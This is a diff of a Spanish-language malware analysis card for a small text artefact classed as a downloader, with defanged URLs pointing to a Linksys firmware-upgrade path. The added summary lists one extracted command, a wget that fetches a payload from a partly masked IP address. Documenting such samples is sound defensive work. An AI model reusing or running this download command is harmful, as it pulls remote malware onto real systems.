@@ -4,7 +4,9 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with CRLF line terminators de 444 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Upgrade` en `hxxp://linksys[.]com/jnap/firmware/Upgrade`. Se extrajeron 2 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 444 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Upgrade` en `hxxp://linksys[.]com/jnap/firmware/Upgrade`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `wget hxxp://91.92.40.XXX/w` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/3b06f8091b35d5cc01eef33f6d6a45291aa1ea841e049e6f90e57133ed3cd357.md](../../../../../malware-like/oraculo/downloader/3b06f8091b35d5cc01eef33f6d6a45291aa1ea841e049e6f90e57133ed3cd357.md)
 
 
 ## 🏷️ Clasificación
